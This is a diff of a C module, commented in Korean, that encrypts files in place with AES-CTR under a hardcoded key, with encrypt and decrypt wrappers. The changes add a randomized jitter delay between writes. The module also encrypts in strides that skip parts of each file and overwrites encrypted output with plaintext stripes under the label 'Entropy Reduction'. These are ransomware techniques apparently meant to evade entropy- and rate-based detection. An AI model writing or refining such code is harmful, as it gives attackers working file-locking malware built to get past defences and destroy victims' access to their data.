@@ -10,15 +10,11 @@
 #include <arpa/inet.h> 
 #include <endian.h>     // be64toh, htobe64 (리눅스 표준)
 
-// main.c와 동일하게 맞춤 (필요시 main.c의 define을 따라감)
 #ifndef CHUNK_SIZE
 #define CHUNK_SIZE (128 * 1024)
 #endif
 
-// 0.12초 (속도가 너무 느리면 50000 등으로 줄여서 튜닝 가능)
-#define WRITE_DELAY_US 120000 
-
-// 키 (고정)
+// Static AES Key
 static const unsigned char aes_key[32] = {
     0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
     0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
@@ -30,7 +26,35 @@ void handle_openssl_errors(void) {
     ERR_print_errors_fp(stderr);
 }
 
-// 경로 기반 해시 IV 생성 (기존 로직 유지)
+/**
+ * @brief 스마트 지터 지연 함수
+ * 딜레이 시간 랜덤화(110ms ~ 130ms)와 휴식모드 도입
+ */
+void smart_jitter_delay() {
+    static int was_last_fast = 0; // 초기값: 0 (처음엔 보통 모드로 시작)
+    int delay;
+
+    if (was_last_fast) {
+        // [휴식 모드]
+        // 이전에 빨랐으므로(0.12 미만), 이번엔 0.12 ~ 0.13 사이로 강제 조정
+        // 절대 0.11이 나오지 않게 함 -> 연속 고속 방지
+        // 범위: 120,000 ~ 130,000 (0.12s ~ 0.13s)
+        delay = 120000 + (rand() % 10001); 
+        was_last_fast = 0; // 휴식 완료
+    } else {
+        // [자유 모드]
+        // 범위: 110,000 ~ 130,000 (0.11s ~ 0.13s)
+        delay = 110000 + (rand() % 20001);
+
+        // 이번 딜레이가 0.12초 미만(즉, 0.11초 대)이었다면 다음 딜레이는 휴식 모드로
+        if (delay < 120000) {
+            was_last_fast = 1;
+        }
+    }
+    usleep(delay);
+}
+
+// 경로 기반 해시 IV 생성
 void generate_iv_from_path(const char *filepath, unsigned char *iv_out) {
     unsigned char hash[SHA256_DIGEST_LENGTH];
     SHA256_CTX sha256;
@@ -40,16 +64,23 @@ void generate_iv_from_path(const char *filepath, unsigned char *iv_out) {
     memcpy(iv_out, hash, 16);
 }
 
-// [추가] 특정 오프셋에 맞는 AES-CTR IV 계산 함수
-// (루프 안에서 반복 호출하기 위해 분리함)
+/**
+ * @brief 오프셋 기반 IV 동기화
+ * AES-CTR 모드는 스트림 암호이므로, 파일 중간부터 암호화할 때
+ * Counter 값을 정확히 맞춰주지 않으면 복호화 불가.
+ * Logic:
+ * 1. Base IV = FilePath 기반 SHA256 해시값
+ * 2. Counter = Offset / 16 (AES Block Size)
+ * 3. IV += Counter
+ */
 void calculate_chunk_iv(const char *filepath, long offset, unsigned char *iv_out) {
     // 1. 기본 해시 IV 생성
     generate_iv_from_path(filepath, iv_out);
 
-    // 2. 오프셋에 따른 블록 카운터 계산 (AES 블록 16바이트)
+    // 2. 오프셋에 따른 블록 카운터 계산
     uint64_t block_counter = offset / 16;
     
-    // 3. IV 뒤쪽 8바이트에 카운터 반영
+    // 3. IV 하위 8바이트에 카운터 가산
     if (block_counter > 0) {
         uint64_t *counter_ptr = (uint64_t*)(iv_out + 8);
         uint64_t host_counter = be64toh(*counter_ptr);
@@ -59,8 +90,8 @@ void calculate_chunk_iv(const char *filepath, long offset, unsigned char *iv_out
 }
 
 /**
- * [수정됨] Stride 지원 Worker
- * @param skip_distance: 한 번 쓰고 나서 건너뛸 거리 (main.c에서 전달받음)
+ * Stride 지원 Worker
+ * @param skip_distance: 한 번 쓰고 나서 건너뛸 거리
  */
 static int process_chunk_stride(const char *filepath, long start_offset, int chunks_to_write, long stride_chunk_size, long skip_distance, int mode) {
     FILE *fp = fopen(filepath, "r+b");
@@ -69,7 +100,7 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
         return -1; 
     }
 
-    // 메모리 할당 (기존 유지)
+    // 메모리 할당
     unsigned char *in_buf = malloc(stride_chunk_size);
     unsigned char *out_buf = malloc(stride_chunk_size + EVP_MAX_BLOCK_LENGTH);
 
@@ -94,7 +125,7 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
     unsigned char current_iv[16]; // 매 청크마다 계산될 IV
 
     // =================================================================
-    // [핵심 변경] 루프 구조: Init -> Update -> Write -> Skip -> Sleep
+    // Stride 루프 구조: Init -> Update -> Write -> Skip -> Sleep
     // =================================================================
     for (int i = 0; i < chunks_to_write; i++) {
         
@@ -105,8 +136,8 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
         int read_len = fread(in_buf, 1, stride_chunk_size, fp);
         if (read_len <= 0) break; 
 
-        // 3. [중요] 현재 위치(current_pos)에 맞는 IV 계산
-        // 건너뛰기를 하면 오프셋이 불연속적이므로, 매번 다시 초기화해야 함
+        // 3. 현재 위치(current_pos)에 맞는 IV 계산
+        // 불연속적인 위치 접근이므로 매 청크마다 IV를 재설정해야 함.
         calculate_chunk_iv(filepath, current_pos, current_iv);
 
         // 4. 암/복호화 초기화 (Init)
@@ -126,7 +157,8 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
             }
         }
 
-        // 5. [기존 유지] 샌드위치 기법 (Entropy Reduction)
+        // 5.샌드위치 기법 (Entropy Reduction)
+        // 암호화된 버퍼 중간중간에 원본(Plaintext) 블록을 강제로 덮어씀.
         int stripe_size = 16; 
         for (int k = 0; k < out_len; k += (stripe_size * 2)) {
             int skip_offset = k + stripe_size;
@@ -144,12 +176,12 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
         fwrite(out_buf, 1, out_len, fp);
         fflush(fp); 
 
-        // 7. [핵심] 다음 위치 계산 (Stride 적용)
+        // 7.다음 위치 계산 (Stride 적용)
         // 읽은 만큼 + 건너뛸 만큼 점프
         current_pos += read_len + skip_distance;
 
         // 8. 딜레이
-        usleep(WRITE_DELAY_US);
+        smart_jitter_delay();
     }
     
     // 루프 종료 후 정리
@@ -161,16 +193,12 @@ static int process_chunk_stride(const char *filepath, long start_offset, int chu
     return ret;
 }
 
-// === main.c와 호환되는 Wrapper 함수 ===
-
-// main.c에서 호출하는 이름: encrypt_chunk_stride
+// 암호화를 위한 래핑 함수
 int encrypt_chunk_stride(const char *filepath, long start_offset, int chunks, long chunk_size, long skip_distance) {
-    // mode 0: Encrypt
     return process_chunk_stride(filepath, start_offset, chunks, chunk_size, skip_distance, 0);
 }
 
-// main.c에서 호출하는 이름: decrypt_chunk_stride
+// 복호화를 위한 래핑 함수
 int decrypt_chunk_stride(const char *filepath, long start_offset, int chunks, long chunk_size, long skip_distance) {
-    // mode 1: Decrypt
     return process_chunk_stride(filepath, start_offset, chunks, chunk_size, skip_distance, 1);
 }
